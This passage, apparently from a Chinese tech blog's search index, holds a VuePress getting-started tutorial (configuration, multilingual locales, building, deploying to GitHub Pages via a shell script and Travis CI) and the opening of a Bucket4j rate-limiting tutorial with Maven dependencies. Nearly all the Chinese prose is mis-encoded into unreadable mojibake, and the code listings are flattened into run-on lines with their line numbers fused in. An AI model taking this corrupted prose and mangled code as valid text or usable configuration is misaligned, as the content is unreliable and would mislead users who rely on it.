ç›®å½•çš„ã€‚åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹çš„ package.json ä¸­æ·»åŠ å¦‚ä¸‹ scripts ï¼š 123456{ "scripts": { "dev": "vuepress dev docs", "build": "vuepress build docs" }} å¯¹äºä¸Šè¿°çš„ç›®å½•ç»“æ„ï¼ŒVuepress çš„é»˜è®¤é¡µé¢è·¯ç”±åœ°å€å¦‚ä¸‹ï¼š æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„ é¡µé¢è·¯ç”±åœ°å€ /README.md / /guide/README.md /guide/ /config.md /config.html åŸºæœ¬é…ç½®é…ç½®æ–‡ä»¶å¦‚æœæ²¡æœ‰ä»»ä½•é…ç½®ï¼Œè¿™ä¸ªç½‘ç«™å°†ä¼šæ˜¯éå¸¸å±€é™çš„ï¼Œç”¨æˆ·ä¹Ÿæ— æ³•åœ¨ä½ çš„ç½‘ç«™ä¸Šè‡ªç”±å¯¼èˆªã€‚ä¸ºäº†æ›´å¥½åœ°è‡ªå®šä¹‰ä½ çš„ç½‘ç«™ï¼Œé¦–å…ˆéœ€è¦åœ¨ä½ çš„æ–‡æ¡£ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª .vuepress ç›®å½•ï¼Œæ‰€æœ‰ VuePress ç›¸å…³çš„æ–‡ä»¶éƒ½å°†ä¼šè¢«æ”¾åœ¨è¿™é‡Œï¼Œé¡¹ç›®ç»“æ„ç¤ºä¾‹å¦‚ä¸‹ï¼š 123456.â”œâ”€ docsâ”‚ â”œâ”€ README.mdâ”‚ â””â”€ .vuepressâ”‚ â””â”€ config.jsâ””â”€ package.json ä¸€ä¸ª VuePress ç½‘ç«™æœ€å¿…è¦çš„é…ç½®æ–‡ä»¶æ˜¯ .vuepress/config.jsï¼Œå®ƒåº”è¯¥å¯¼å‡ºä¸€ä¸ª JavaScript å¯¹è±¡ï¼š 1234module.exports = { title: \'Hello VuePress\', description: \'Just playing around\'} å¯¹äºä¸Šè¿°çš„é…ç½®ï¼Œå¦‚æœä½ è¿è¡Œèµ· dev serverï¼Œä½ åº”è¯¥èƒ½çœ‹åˆ°ä¸€ä¸ªé¡µé¢ï¼Œå®ƒåŒ…å«ä¸€ä¸ªé¡µå¤´ï¼Œé‡Œé¢åŒ…å«ä¸€ä¸ªæ ‡é¢˜å’Œä¸€ä¸ªæœç´¢æ¡†ã€‚VuePress å†…ç½®äº†åŸºäº headers çš„æœç´¢ â€”â€” å®ƒä¼šè‡ªåŠ¨ä¸ºæ‰€æœ‰é¡µé¢çš„æ ‡é¢˜ã€h2 å’Œ h3 æ„å»ºèµ·ä¸€ä¸ªç®€å•çš„æœç´¢ç´¢å¼•ã€‚å¯å‚è§ é…ç½® æ¥æŸ¥çœ‹æ‰€æœ‰å¯é…ç½®çš„é€‰é¡¹ã€‚ Tip å…¶ä»–é…ç½®æ ¼å¼ï¼šä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ YAML (.vuepress/config.yml) æˆ–æ˜¯ TOML (.vuepress/config.toml) æ ¼å¼çš„é…ç½®æ–‡ä»¶ ä¸»é¢˜é…ç½®ä¸€ä¸ª VuePress ä¸»é¢˜åº”è¯¥è´Ÿè´£æ•´ä¸ªç½‘ç«™çš„å¸ƒå±€å’Œäº¤äº’ç»†èŠ‚ã€‚åœ¨ VuePress ä¸­ï¼Œç›®å‰è‡ªå¸¦äº†ä¸€ä¸ªé»˜è®¤çš„ä¸»é¢˜ï¼ˆæ­£æ˜¯ä½ ç°åœ¨æ‰€çœ‹åˆ°çš„ï¼‰ï¼Œå®ƒæ˜¯ä¸ºæŠ€æœ¯æ–‡æ¡£è€Œè®¾è®¡çš„ã€‚åŒæ—¶ï¼Œé»˜è®¤ä¸»é¢˜æä¾›äº†ä¸€äº›é€‰é¡¹ï¼Œè®©ä½ å¯ä»¥å»è‡ªå®šä¹‰å¯¼èˆªæ ï¼ˆnavbarï¼‰ã€ ä¾§è¾¹æ ï¼ˆsidebarï¼‰å’Œ é¦–é¡µï¼ˆhomepageï¼‰ ç­‰ï¼Œè¯¦æƒ…è¯·å‚è§ é»˜è®¤ä¸»é¢˜é…ç½® ï¼Œå¦‚æœä½ æƒ³å¼€å‘ä¸€ä¸ªè‡ªå®šä¹‰ä¸»é¢˜ï¼Œå¯ä»¥å‚è€ƒ è‡ªå®šä¹‰ä¸»é¢˜ã€‚ åº”ç”¨çº§åˆ«çš„é…ç½®ç”±äº VuePress æ˜¯ä¸€ä¸ªæ ‡å‡†çš„ Vue åº”ç”¨ï¼Œä½ å¯ä»¥é€šè¿‡åˆ›å»ºä¸€ä¸ª .vuepress/enhanceApp.js æ–‡ä»¶æ¥åšä¸€äº›åº”ç”¨çº§åˆ«çš„é…ç½®ï¼Œå½“è¯¥æ–‡ä»¶å­˜åœ¨çš„æ—¶å€™ï¼Œä¼šè¢«å¯¼å…¥åˆ°åº”ç”¨å†…éƒ¨ã€‚enhanceApp.js åº”è¯¥ export default ä¸€ä¸ªé’©å­å‡½æ•°ï¼Œå¹¶æ¥å—ä¸€ä¸ªåŒ…å«äº†ä¸€äº›åº”ç”¨çº§åˆ«å±æ€§çš„å¯¹è±¡ä½œä¸ºå‚æ•°ã€‚ä½ å¯ä»¥ä½¿ç”¨è¿™ä¸ªé’©å­æ¥å®‰è£…ä¸€äº›é™„åŠ çš„ Vue æ’ä»¶ã€æ³¨å†Œå…¨å±€ç»„ä»¶ï¼Œæˆ–è€…å¢åŠ é¢å¤–çš„è·¯ç”±é’©å­ç­‰ï¼š 12345678910// ä½¿ç”¨å¼‚æ­¥å‡½æ•°ä¹Ÿæ˜¯å¯ä»¥çš„export default ({ Vue, // VuePress æ­£åœ¨ä½¿ç”¨çš„ Vue æ„é€ å‡½æ•° options, // é™„åŠ åˆ°æ ¹å®ä¾‹çš„ä¸€äº›é€‰é¡¹ router, // å½“å‰åº”ç”¨çš„è·¯ç”±å®ä¾‹ siteData, // ç«™ç‚¹å…ƒæ•°æ® isServer // å½“å‰åº”ç”¨é…ç½®æ˜¯å¤„äº æœåŠ¡ç«¯æ¸²æŸ“ æˆ– å®¢æˆ·ç«¯}) =&gt; { // ...åšä¸€äº›å…¶ä»–çš„åº”ç”¨çº§åˆ«çš„ä¼˜åŒ–} é™æ€èµ„æºç›¸å¯¹è·¯å¾„æ‰€æœ‰çš„ Markdown æ–‡ä»¶éƒ½ä¼šè¢« Webpack ç¼–è¯‘æˆ Vue ç»„ä»¶ï¼Œå› æ­¤ä½ å¯ä»¥ï¼Œå¹¶ä¸”åº”è¯¥æ›´å€¾å‘äºä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼ˆRelative URLsï¼‰æ¥å¼•ç”¨æ‰€æœ‰çš„é™æ€èµ„æºï¼š 1![An image](./image.png) åŒæ ·åœ°ï¼Œè¿™åœ¨ *.vue æ–‡ä»¶çš„æ¨¡æ¿ä¸­ä¸€æ ·å¯ä»¥å·¥ä½œï¼Œå›¾ç‰‡å°†ä¼šè¢« url-loader å’Œ file-loader å¤„ç†ï¼Œåœ¨è¿è¡Œç”Ÿæˆé™æ€æ–‡ä»¶çš„æ„å»ºä»»åŠ¡æ—¶ï¼Œæ–‡ä»¶ä¼šè¢«å¤åˆ¶åˆ°æ­£ç¡®çš„ä½ç½®ã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œä½ ä¹Ÿä½¿ç”¨ ~ å‰ç¼€æ¥æ˜ç¡®åœ°æŒ‡å‡ºè¿™æ˜¯ä¸€ä¸ª Webpack çš„æ¨¡å—è¯·æ±‚ï¼Œè¿™å°†å…è®¸ä½ é€šè¿‡ Webpack åˆ«åæ¥å¼•ç”¨æ–‡ä»¶æˆ–è€… NPM çš„ä¾èµ–ï¼š 12![Image from alias](~@alias/image.png)![Image from dependency](~some-dependency/image.png) Webpack çš„åˆ«åå¯ä»¥é€šè¿‡ .vuepress/config.js ä¸­ configureWebpack æ¥é…ç½®ï¼Œå¦‚ï¼š 123456789module.exports = { configureWebpack: { resolve: { alias: { \'@alias\': \'path/to/some/dir\' } } }} å…¬å…±æ–‡ä»¶æœ‰æ—¶ï¼Œä½ å¯èƒ½éœ€è¦æä¾›ä¸€ä¸ªé™æ€èµ„æºï¼Œä½†æ˜¯å®ƒä»¬å¹¶ä¸ç›´æ¥è¢«ä½ çš„ä»»ä½•ä¸€ä¸ª Markdown æ–‡ä»¶æˆ–è€…ä¸»é¢˜ç»„ä»¶å¼•ç”¨ â€”â€” ä¸¾ä¾‹æ¥è¯´ï¼Œfavicons å’Œ PWA çš„å›¾æ ‡ï¼Œåœ¨è¿™ç§æƒ…å½¢ä¸‹ï¼Œä½ å¯ä»¥å°†å®ƒä»¬æ”¾åœ¨ .vuepress/public ä¸­ï¼Œ å®ƒä»¬æœ€ç»ˆä¼šè¢«å¤åˆ¶åˆ°ç”Ÿæˆçš„é™æ€æ–‡ä»¶å¤¹ä¸­ã€‚ åŸºç¡€è·¯å¾„å¦‚æœä½ çš„ç½‘ç«™ä¼šè¢«éƒ¨ç½²åˆ°ä¸€ä¸ªéæ ¹è·¯å¾„ï¼Œä½ å°†éœ€è¦åœ¨ .vuepress/config.js ä¸­è®¾ç½® baseï¼Œä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æœä½ æ‰“ç®—å°†ä½ çš„ç½‘ç«™éƒ¨ç½²åˆ° https://foo.github.io/bar/ï¼Œé‚£ä¹ˆ base çš„å€¼å°±åº”è¯¥è¢«è®¾ç½®ä¸º "/bar/" (åº”å½“æ€»æ˜¯ä»¥æ–œæ å¼€å§‹ï¼Œå¹¶ä»¥æ–œæ ç»“æŸ)ã€‚æœ‰äº†åŸºç¡€è·¯å¾„ï¼ˆBase URLï¼‰ï¼Œå¦‚æœä½ å¸Œæœ›å¼•ç”¨ä¸€å¼ æ”¾åœ¨ .vuepress/public ä¸­çš„å›¾ç‰‡ï¼Œä½ éœ€è¦ä½¿ç”¨è¿™æ ·è·¯å¾„ï¼š/bar/image.pngï¼Œç„¶è€Œï¼Œä¸€æ—¦æŸä¸€å¤©ä½ å†³å®šå»ä¿®æ”¹ baseï¼Œè¿™æ ·çš„è·¯å¾„å¼•ç”¨å°†ä¼šæ˜¾å¾—å¼‚å¸¸è„†å¼±ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒVuePress æä¾›äº†å†…ç½®çš„ä¸€ä¸ª helper $withBaseï¼ˆå®ƒè¢«æ³¨å…¥åˆ°äº† Vue çš„åŸå‹ä¸Šï¼‰ï¼Œå¯ä»¥å¸®åŠ©ä½ ç”Ÿæˆæ­£ç¡®çš„è·¯å¾„ï¼š 1&lt;img :src="$withBase(\'/foo.png\')" alt="foo"&gt; å€¼å¾—ä¸€æçš„æ˜¯ï¼Œä½ ä¸ä»…å¯ä»¥åœ¨ä½ çš„ Vue ç»„ä»¶ä¸­ä½¿ç”¨ä¸Šè¿°çš„è¯­æ³•ï¼Œåœ¨ Markdown æ–‡ä»¶ä¸­äº¦æ˜¯å¦‚æ­¤ã€‚æœ€åè¡¥å……ä¸€å¥ï¼Œä¸€ä¸ª base è·¯å¾„ä¸€æ—¦è¢«è®¾ç½®ï¼Œå®ƒå°†ä¼šè‡ªåŠ¨åœ°ä½œä¸ºå‰ç¼€æ’å…¥åˆ° .vuepress/config.js ä¸­æ‰€æœ‰ä»¥ / å¼€å§‹çš„èµ„æºè·¯å¾„ä¸­ã€‚ å¤šè¯­è¨€æ”¯æŒç«™ç‚¹å¤šè¯­è¨€é…ç½®è¦å¯ç”¨ VuePress çš„å¤šè¯­è¨€æ”¯æŒï¼Œé¦–å…ˆéœ€è¦ä½¿ç”¨å¦‚ä¸‹çš„æ–‡ä»¶ç»“æ„ï¼š 12345678910docsâ”œâ”€ README.mdâ”œâ”€ foo.mdâ”œâ”€ nestedâ”‚&nbsp;&nbsp;â””â”€ README.mdâ””â”€ zh â”œâ”€ README.md â”œâ”€ foo.md â””â”€ nested &nbsp;&nbsp; â””â”€ README.md ç„¶åï¼Œåœ¨ .vuepress/config.js ä¸­æä¾› locales é€‰é¡¹ï¼š 12345678910111213141516module.exports = { locales: { // é”®åæ˜¯è¯¥è¯­è¨€æ‰€å±çš„å­è·¯å¾„ // ä½œä¸ºç‰¹ä¾‹ï¼Œé»˜è®¤è¯­è¨€å¯ä»¥ä½¿ç”¨ \'/\' ä½œä¸ºå…¶è·¯å¾„ã€‚ \'/\': { lang: \'en-US\', // å°†ä¼šè¢«è®¾ç½®ä¸º &lt;html&gt; çš„ lang å±æ€§ title: \'VuePress\', description: \'Vue-powered Static Site Generator\' }, \'/zh/\': { lang: \'zh-CN\', title: \'VuePress\', description: \'Vue é©±åŠ¨çš„é™æ€ç½‘ç«™ç”Ÿæˆå™¨\' } }} å¦‚æœä¸€ä¸ªè¯­è¨€æ²¡æœ‰å£°æ˜ title æˆ–è€… descriptionï¼ŒVuePress å°†ä¼šå°è¯•ä½¿ç”¨é…ç½®é¡¶å±‚çš„å¯¹åº”å€¼ã€‚å¦‚æœæ¯ä¸ªè¯­è¨€éƒ½å£°æ˜äº† title å’Œ descriptionï¼Œåˆ™é¡¶å±‚çš„è¿™ä¸¤ä¸ªå€¼å¯ä»¥è¢«çœç•¥ã€‚ é»˜è®¤ä¸»é¢˜å¤šè¯­è¨€é…ç½®é»˜è®¤ä¸»é¢˜ä¹Ÿå†…ç½®äº†å¤šè¯­è¨€æ”¯æŒï¼Œå¯ä»¥é€šè¿‡ themeConfig.locales æ¥é…ç½®ã€‚è¯¥é€‰é¡¹æ¥å—åŒæ ·çš„ { path: config } æ ¼å¼çš„å€¼ã€‚æ¯ä¸ªè¯­è¨€é™¤äº†å¯ä»¥é…ç½®ä¸€äº›ç«™ç‚¹ä¸­ç”¨åˆ°çš„æ–‡å­—ä¹‹å¤–ï¼Œè¿˜å¯ä»¥æ‹¥æœ‰è‡ªå·±çš„ å¯¼èˆªæ  å’Œ ä¾§è¾¹æ  é…ç½®ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647module.exports = { locales: { \'/\': { lang: \'en-US\', title: \'VuePress\', description: \'Vue-powered Static Site Generator\' }, \'/zh/\': { lang: \'zh-CN\', title: \'VuePress\', description: \'Vue é©±åŠ¨çš„é™æ€ç½‘ç«™ç”Ÿæˆå™¨\' } }, themeConfig: { locales: { \'/\': { selectText: \'Languages\', label: \'English\', ariaLabel: \'Languages\', editLinkText: \'Edit this page on GitHub\', algolia: {}, nav: [ {text: \'Nested\', link: \'/nested/\', ariaLabel: \'Nested\'} ], sidebar: { \'/nested/\': [/* ... */] } }, \'/zh/\': { // å¤šè¯­è¨€ä¸‹æ‹‰èœå•çš„æ ‡é¢˜ selectText: \'é€‰æ‹©è¯­è¨€\', // è¯¥è¯­è¨€åœ¨ä¸‹æ‹‰èœå•ä¸­çš„æ ‡ç­¾ label: \'ç®€ä½“ä¸­æ–‡\', // ç¼–è¾‘é“¾æ¥æ–‡å­— editLinkText: \'åœ¨ GitHub ä¸Šç¼–è¾‘æ­¤é¡µ\', // å½“å‰ locale çš„ algolia docsearch é€‰é¡¹ algolia: {}, nav: [ {text: \'åµŒå¥—\', link: \'/zh/nested/\'} ], sidebar: { \'/zh/nested/\': [/* ... */] } } } }} ç¼–è¯‘æ„å»º åœ¨ config.js ä¸­æŒ‡å®šæ„å»ºçš„ç›®æ ‡ç›®å½•ï¼š 123module.exports = { dest: \'docs/.vuepress/dist\'} é€šè¿‡ä»¥ä¸‹å‘½ä»¤ç¼–è¯‘æ„å»ºï¼Œç”Ÿæˆ VuePress ç½‘ç«™æ‰€éœ€çš„é™æ€æ–‡ä»¶ï¼Œè¿™æ ·å°±å¯ä»¥å¾ˆæ–¹ä¾¿åœ°å°† VuePress æ–‡æ¡£éƒ¨ç½²åˆ°ä»»æ„çš„ Web æœåŠ¡å™¨ 123456789101112131415161718192021# ç¼–è¯‘æ„å»º$ yarm docs:build# æˆ–è€…$ npm run docs:build# æˆåŠŸç¼–è¯‘åï¼Œä¼šåœ¨æŒ‡å®šçš„ç›®å½•ä¸‹ç”Ÿæˆç½‘ç«™çš„æ‰€æœ‰é™æ€æ–‡ä»¶ï¼Œç›®å½•ç»“æ„å¦‚ä¸‹docs/.vuepress/distâ”œâ”€â”€ 404.htmlâ”œâ”€â”€ assetsâ”œâ”€â”€ contactâ”œâ”€â”€ debugâ”œâ”€â”€ enâ”œâ”€â”€ faqâ”œâ”€â”€ favicon.icoâ”œâ”€â”€ guideâ”œâ”€â”€ hero.pngâ”œâ”€â”€ index.htmlâ”œâ”€â”€ logo.pngâ”œâ”€â”€ manifest.jsonâ””â”€â”€ service-worker.js ç›®å½•ç»“æ„è¯´æ˜ å¦‚æœ docs ç›®å½•åšä¸ºé¡¶çº§ç›®å½•ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 123456.â”œâ”€ docsâ”‚ â”œâ”€ README.mdâ”‚ â””â”€ .vuepressâ”‚ â””â”€ config.jsâ””â”€ package.json é‚£ä¹ˆ config.js çš„é…ç½®å†…å®¹éœ€è¦æ›´æ”¹ä¸ºï¼š 123module.exports = { dest: \'.vuepress/dist\'} ç¼–è¯‘æ„å»ºçš„å‘½ä»¤åˆ™æ›´æ”¹ä¸ºï¼š 1234$ yarn build# æˆ–è€…$ npm run build éƒ¨ç½²æ–¹å¼GitHub Pages åœ¨ docs/.vuepress/config.js ä¸­è®¾ç½®æ­£ç¡®çš„ base å¦‚æœä½ æ‰“ç®—å‘å¸ƒåˆ° https://&lt;USERNAME&gt;.github.io/ï¼Œåˆ™å¯ä»¥çœç•¥è¿™ä¸€æ­¥ï¼Œå› ä¸º base é»˜è®¤å³æ˜¯ "/"ã€‚ å¦‚æœä½ æ‰“ç®—å‘å¸ƒåˆ° https://&lt;USERNAME&gt;.github.io/&lt;REPO&gt;/ï¼ˆä¹Ÿå°±æ˜¯è¯´ä½ çš„ä»“åº“åœ¨ https://github.com/&lt;USERNAME&gt;/&lt;REPO&gt;ï¼‰ï¼Œåˆ™å°† base è®¾ç½®ä¸º "/&lt;REPO&gt;/"ã€‚ åœ¨ä½ çš„é¡¹ç›®ä¸­ï¼Œåˆ›å»ºä¸€ä¸ªå¦‚ä¸‹çš„ deploy.sh æ–‡ä»¶ï¼ˆè¯·è‡ªè¡Œåˆ¤æ–­å»æ‰å¯¹åº”çš„æ³¨é‡Šï¼‰ 12345678910111213141516171819202122232425#!/usr/bin/env sh# ç¡®ä¿è„šæœ¬æŠ›å‡ºé‡åˆ°çš„é”™è¯¯set -e# ç”Ÿæˆé™æ€æ–‡ä»¶npm run docs:build# è¿›å…¥ç”Ÿæˆçš„æ–‡ä»¶å¤¹cd docs/.vuepress/dist# å¦‚æœæ˜¯å‘å¸ƒåˆ°è‡ªå®šä¹‰åŸŸå# echo \'www.example.com\' &gt; CNAMEgit initgit add -Agit commit -m \'deploy\'# å¦‚æœå‘å¸ƒåˆ° https://&lt;USERNAME&gt;.github.io## git push -f git@github.com:&lt;USERNAME&gt;/&lt;USERNAME&gt;.github.io.git master# å¦‚æœå‘å¸ƒåˆ° https://&lt;USERNAME&gt;.github.io/&lt;REPO&gt;## git push -f git@github.com:&lt;USERNAME&gt;/&lt;REPO&gt;.git master:gh-pagescd - ä½ å¯ä»¥åœ¨ä½ çš„æŒç»­é›†æˆçš„è®¾ç½®ä¸­ï¼Œè®¾ç½®åœ¨æ¯æ¬¡ Push ä»£ç æ—¶è‡ªåŠ¨è¿è¡Œä¸Šè¿° Shell è„šæœ¬ GitHub Pages and Travis CI åœ¨ docs/.vuepress/config.js ä¸­è®¾ç½®æ­£ç¡®çš„ base å¦‚æœä½ æ‰“ç®—å‘å¸ƒåˆ° https://&lt;USERNAME or GROUP&gt;.github.io/ï¼Œåˆ™å¯ä»¥çœç•¥è¿™ä¸€æ­¥ï¼Œå› ä¸º base é»˜è®¤å³æ˜¯ "/"ã€‚ å¦‚æœä½ æ‰“ç®—å‘å¸ƒåˆ° https://&lt;USERNAME or GROUP&gt;.github.io/&lt;REPO&gt;/ï¼ˆä¹Ÿå°±æ˜¯è¯´ä½ çš„ä»“åº“åœ¨ https://github.com/&lt;USERNAME&gt;/&lt;REPO&gt;ï¼‰ï¼Œåˆ™å°† base è®¾ç½®ä¸º "/&lt;REPO&gt;/"ã€‚ åœ¨é¡¹ç›®çš„æ ¹ç›®å½•åˆ›å»ºä¸€ä¸ªåä¸º .travis.yml çš„æ–‡ä»¶ åœ¨æœ¬åœ°æ‰§è¡Œ yarn æˆ– npm install å¹¶ä¸”æäº¤ç”Ÿæˆçš„ lock æ–‡ä»¶ï¼ˆå³ yarn.lock æˆ– package-lock.jsonï¼‰ ä½¿ç”¨ GitHub Pages éƒ¨ç½²æä¾›ç¨‹åºæ¨¡æ¿ï¼Œå¹¶éµå¾ª Travis æ–‡æ¡£è§„èŒƒ æ¥ç¼–å†™ .travis.yml æ–‡ä»¶ 123456789101112131415language: node_jsnode_js: - lts/*install: - yarn install # npm ciscript: - yarn docs:build # npm run docs:builddeploy: provider: pages skip_cleanup: true local_dir: docs/.vuepress/dist github_token: $GITHUB_TOKEN # åœ¨ GitHub ä¸­ç”Ÿæˆï¼Œç”¨äºå…è®¸ Travis å‘ä½ çš„ä»“åº“æ¨é€ä»£ç ã€‚åœ¨ Travis çš„é¡¹ç›®è®¾ç½®é¡µé¢è¿›è¡Œé…ç½®ï¼Œè®¾ç½®ä¸º secure variable keep_history: true on: branch: master ä¸‹ç¯‡ - VuePress å…¥é—¨æ•™ç¨‹ä¹‹äºŒ VuePress å…¥é—¨æ•™ç¨‹ä¹‹äºŒ Markdown ç¯‡ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"é™æ€åšå®¢"},{title:"Bucket4j é™æµå…¥é—¨æ•™ç¨‹ä¹‹ä¸€",url:"/posts/2885bf23.html",text:'å‰è¨€é™æµæ¦‚è¿°åœ¨å¼€å‘é«˜å¹¶å‘ç³»ç»Ÿæ—¶å¯ä»¥ç”¨ä¸‰æŠŠåˆ©å™¨æ¥ä¿æŠ¤ç³»ç»Ÿï¼šç¼“å­˜ã€é™çº§å’Œé™æµã€‚ç¼“å­˜çš„ç›®çš„æ˜¯æå‡ç³»ç»Ÿè®¿é—®é€Ÿåº¦å’Œå¢å¤§ç³»ç»Ÿå¤„ç†çš„å®¹é‡ï¼Œæ˜¯æŠ—é«˜å¹¶å‘æµé‡çš„ â€œé“¶å¼¹â€ï¼›è€Œé™çº§æ˜¯å½“æœåŠ¡å‡ºç°é—®é¢˜æˆ–è€…å½±å“åˆ°æ ¸å¿ƒæµç¨‹æ—¶ï¼Œéœ€è¦æš‚æ—¶å°†å…¶å±è”½æ‰ï¼Œå¾…é«˜å³°è¿‡å»ä¹‹åæˆ–è€…é—®é¢˜è§£å†³åå†æ‰“å¼€ï¼›è€Œæœ‰äº›åœºæ™¯å¹¶ä¸èƒ½ç”¨ç¼“å­˜å’Œé™çº§æ¥è§£å†³ï¼Œæ¯”å¦‚ç¨€ç¼ºèµ„æºï¼ˆç§’æ€ã€æŠ¢è´­ï¼‰ã€å†™æœåŠ¡ï¼ˆå¦‚è¯„è®ºã€ä¸‹å•ï¼‰ã€é¢‘ç¹çš„å¤æ‚æŸ¥è¯¢ç­‰ï¼Œå› æ­¤éœ€è¦æœ‰ä¸€ç§æ‰‹æ®µæ¥é™åˆ¶è¿™äº›åœºæ™¯çš„å¹¶å‘ / è¯·æ±‚é‡ï¼Œå³é™æµã€‚é™æµçš„ç›®çš„æ˜¯é€šè¿‡å¯¹å¹¶å‘è®¿é—® / è¯·æ±‚è¿›è¡Œé™é€Ÿæˆ–è€…å¯¹ä¸€ä¸ªæ—¶é—´çª—å£å†…çš„è¯·æ±‚è¿›è¡Œé™é€Ÿæ¥ä¿æŠ¤ç³»ç»Ÿï¼Œä¸€æ—¦è¾¾åˆ°é™åˆ¶é€Ÿç‡åˆ™å¯ä»¥æ‹’ç»æœåŠ¡ï¼ˆå®šå‘åˆ°é”™è¯¯é¡µæˆ–å‹å¥½çš„å±•ç¤ºé¡µï¼‰ã€æ’é˜Ÿæˆ–ç­‰å¾…ï¼ˆæ¯”å¦‚ç§’æ€ã€è¯„è®ºã€ä¸‹å•ç­‰åœºæ™¯ï¼‰ã€é™çº§ï¼ˆè¿”å›å…œåº•æ•°æ®æˆ–é»˜è®¤æ•°æ®ï¼‰ã€‚ä¸»æµçš„ä¸­é—´ä»¶éƒ½ä¼šæœ‰å•æœºé™æµæ¡†æ¶ï¼Œä¸€èˆ¬æ”¯æŒä¸¤ç§é™æµæ¨¡å¼ï¼šæ§åˆ¶é€Ÿç‡å’Œæ§åˆ¶å¹¶å‘ã€‚Spring Cloud Zuul é€šè¿‡ç¬¬ä¸‰æ–¹æ‰©å±• spring-cloud-zuul-ratelimit ä¹Ÿå¯ä»¥æ”¯æŒé™æµï¼Œè€Œ Spring Cloud Gateway çš„é™æµå®ç°å¯ä»¥çœ‹è¿™é‡Œã€‚å¸¸è§çš„é™æµç®—æ³•æœ‰æ¼æ¡¶å’Œä»¤ç‰Œæ¡¶ï¼Œè®¡æ•°å™¨ä¹Ÿå¯ä»¥è¿›è¡Œç²—æš´é™æµå®ç°ã€‚å¯¹äºé™æµç®—æ³•ï¼Œå¯ä»¥å‚è€ƒ Guava ä¸­çš„ RateLimiterã€Bucket4jã€RateLimitJ ç­‰é¡¹ç›®çš„å…·ä½“å®ç°ã€‚ Bucket4j ä»‹ç»Bucket4j æ˜¯åŸºäºä»¤ç‰Œæ¡¶ç®—æ³•çš„ Java é™æµåº“ï¼Œå®ƒä¸»è¦ç”¨åœ¨ 3 ç§åœºæ™¯ï¼š é™åˆ¶æ¯”è¾ƒé‡å·¥ä½œçš„é€Ÿç‡ é™åˆ¶å¯¹ API çš„è®¿é—®é€Ÿç‡ å°†é™æµä½œä¸ºå®šæ—¶å™¨ï¼Œä¾‹å¦‚æœ‰äº›åœºæ™¯é™åˆ¶ä½ å¯¹æœåŠ¡æä¾›æ–¹çš„è°ƒç”¨é€Ÿåº¦ï¼Œå› æ­¤ä½¿ç”¨é™æµå™¨ä½œä¸ºå®šæ—¶å™¨ï¼Œå®šæ—¶æŒ‰ç…§çº¦å®šé€Ÿç‡è°ƒç”¨æœåŠ¡æä¾›æ–¹ Spring Boot æ•´åˆ Bucket4jæœ¬æ¡ˆä¾‹ä¸»è¦æ˜¯ç®€å•æ¼”ç¤ºå¦‚ä½•åœ¨å•æœº Spring Boot åº”ç”¨ä¸­ä½¿ç”¨ Bucket4jï¼Œä½¿ç”¨çš„ç¼“å­˜ç»„ä»¶æ˜¯ Caffeineï¼ˆJCache APIï¼‰ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ç‰¹åˆ«æ³¨æ„ï¼Œåœ¨ä¼ä¸šå¼€å‘ä¸­ï¼Œè‹¥ Spring Boot åº”ç”¨æ˜¯ä»¥é›†ç¾¤çš„æ–¹å¼éƒ¨ç½²ï¼Œåˆ™å¿…é¡»é‡‡ç”¨åˆ†å¸ƒå¼ç¼“å­˜æ–¹æ¡ˆï¼Œå…·ä½“çš„å‚è€ƒæ–¹æ¡ˆå¦‚ä¸‹ï¼š Back-end Documentation page Async supported Optimized serialization Thin-client support Hazelcast bucket4j-hazelcast Yes Yes Planned Apache Ignite bucket4j-ignite Yes n/a Yes Inifinispan bucket4j-infinspan Yes Yes No Oracle Coherence bucket4j-coherence Yes Yes No ä»£ç ç¤ºä¾‹æ·»åŠ  Bucket4j + Spring Boot Starter + Caffeine ç›¸å…³çš„ Maven ä¾èµ– 123456789101112131415161718192021222324252627282930313233343536373839&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.3.7.RELEASE&lt;/version&gt; &lt;relativePath/&gt;&lt;/parent&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.giffing.bucket4j.spring.boot.starter&lt;/groupId&gt; &lt;artifactId&gt;bucket4j-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;0.2.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-cache&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.github.ben-manes.caffeine&lt;/groupId&gt; &lt;artifactId&gt;caffeine&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.github.ben-manes.caffeine&lt;/groupId&gt; &lt;artifactId&gt;jcache&lt;/artifactId&gt; &lt;version&gt;2.5.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javax.cache&lt;/groupId&gt; &lt;artifactId&gt;cache-api&lt;/artifactId&gt; &lt;/dependency&gt; 